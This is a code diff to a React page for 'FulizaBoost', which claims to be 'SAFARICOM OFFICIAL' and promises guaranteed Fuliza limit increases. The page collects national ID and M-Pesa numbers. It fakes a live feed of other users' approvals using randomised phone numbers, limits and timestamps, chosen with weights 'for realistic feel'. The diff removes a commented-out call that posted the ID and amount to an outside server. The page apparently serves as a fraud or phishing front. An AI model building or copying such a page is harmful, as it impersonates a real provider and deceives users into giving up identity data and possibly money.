@@ -15,8 +15,6 @@ const notifications = [
   { phone: "0791****89", limit: 45000 },
 ];
 
-
-// Weighted times for realistic feel
 const notificationTimes = [
   { label: "just now", weight: 50 },
   { label: "3 mins ago", weight: 25 },
@@ -25,11 +23,9 @@ const notificationTimes = [
   { label: "10 mins ago", weight: 3 },
 ];
 
-// Helper function to pick weighted random time
 const getRandomTime = () => {
   const totalWeight = notificationTimes.reduce((sum, t) => sum + t.weight, 0);
   let rand = Math.random() * totalWeight;
-
   for (const t of notificationTimes) {
     if (rand < t.weight) return t.label;
     rand -= t.weight;
@@ -46,12 +42,11 @@ const PersonalDetails = () => {
     ...notifications[0],
     time: "just now",
   });
-  const [showNotification, setShowNotification] = useState(true);
   const [idNumber, setIdNumber] = useState("");
   const [phone, setPhone] = useState("");
   const [loading, setLoading] = useState(false);
+  const [tickerKey, setTickerKey] = useState(0); // triggers animation
 
-  // Load limit from state or sessionStorage
   useEffect(() => {
     if (state?.amount && state?.fee) {
       setLimitData({ amount: state.amount, fee: state.fee });
@@ -65,49 +60,27 @@ const PersonalDetails = () => {
     }
   }, [state]);
 
-  // Rotate notifications with weighted times
   useEffect(() => {
     const interval = setInterval(() => {
-      setShowNotification(false);
-
-      setTimeout(() => {
-        const randomIndex = Math.floor(Math.random() * notifications.length);
-
-        setCurrentNotification({
-          ...notifications[randomIndex],
-          time: getRandomTime(),
-        });
-
-        setShowNotification(true);
-      }, 300);
-    }, 4000);
+      const randomIndex = Math.floor(Math.random() * notifications.length);
+      setCurrentNotification({
+        ...notifications[randomIndex],
+        time: getRandomTime(),
+      });
+      setTickerKey(prev => prev + 1);
+    }, 3000);
 
     return () => clearInterval(interval);
   }, []);
 
-  // Validation
   const isIdValid = /^\d{6,10}$/.test(idNumber);
   const isPhoneValid = /^(0?[71]\d{8})$/.test(phone);
   const isFormValid = isIdValid && isPhoneValid && !loading && limitData !== null;
 
-  const handleVerify = async () => {
+  const handleVerify = () => {
     if (!isFormValid || !limitData) return;
     setLoading(true);
     try {
-      // const response = await fetch("https://fulizaboost-f4ry.onrender.com/api/boosts", {
-      //   method: "POST",
-      //   headers: { "Content-Type": "application/json" },
-      //   body: JSON.stringify({
-      //     identificationNumber: idNumber,
-      //     amount: limitData.amount,
-      //     fee: limitData.fee,
-      //     createdAt: new Date().toISOString(),
-      //   }),
-      // });
-
-      // if (!response.ok) throw new Error("Failed to save boost details");
-      // const savedBoost = await response.json();
-
       navigate("/confirmation", {
         state: {
           limit: limitData.amount,
@@ -129,38 +102,38 @@ const PersonalDetails = () => {
 
   return (
     <main className="pd-container">
-      {/* HEADER */}
       <div className="pd-header">
         <button className="back-btn" onClick={() => navigate(-1)}>←</button>
         <span className="header-title">Personal Details</span>
       </div>
 
-      {/* BRAND */}
       <div className="pd-brand">
         <div className="badge">● SAFARICOM OFFICIAL</div>
         <h1 className="title">FulizaBoost</h1>
         <p className="subtitle">Instant Limit Increase • Guaranteed Approval</p>
       </div>
 
-      {/* NOTIFICATION */}
-      <div className={`notification-overlay ${showNotification ? "show" : ""}`}>
-        <div className="notification-icon"></div>
-        <div className="notification-content">
-          <strong>{currentNotification.phone}</strong> increased to Ksh{" "}
-          {currentNotification.limit.toLocaleString()}
-          <div className="notification-time">• {currentNotification.time}</div>
-        </div>
-      </div>
+     <div className="notification-overlay ticker">
+  <div
+    key={tickerKey} // triggers new animation
+    className="ticker-content"
+  >
+    <div className="notification-icon">⚡</div>
+    <div className="notification-content">
+  <strong>{currentNotification.phone}</strong> increased to Ksh{" "}
+  {currentNotification.limit.toLocaleString()}
+  <span className="notification-time"> • {currentNotification.time}</span>
+</div>
+  </div>
+</div>
 
       <hr />
 
-      {/* FORM */}
       <h2 className="identify-title">Identify Yourself</h2>
       <p className="identify-text">
         This information is required to verify your eligibility for the limit increase.
       </p>
 
-      {/* NATIONAL ID */}
       <div className="form-group">
         <label>National ID Number</label>
         <input
@@ -173,14 +146,13 @@ const PersonalDetails = () => {
         {!isIdValid && idNumber && <span className="error-text">Enter a valid ID number</span>}
       </div>
 
-      {/* PHONE */}
       <div className="form-group">
         <label>M-Pesa Registered Number</label>
         <div className="phone-input">
           <span className="prefix">+254</span>
           <input
             type="text"
-            placeholder="07xx xxx xxx or 01xx xxx xxx"
+            placeholder="07xx xxx xxx"
             value={phone}
             onChange={(e) => setPhone(e.target.value.replace(/\D/g, ""))}
           />
@@ -188,7 +160,6 @@ const PersonalDetails = () => {
         {!isPhoneValid && phone && <span className="error-text">Enter a valid Safaricom number</span>}
       </div>
 
-      {/* FOOTER */}
       <div className="pd-footer">
         <button
           className={`verify-btn ${isFormValid ? "enabled" : ""}`}
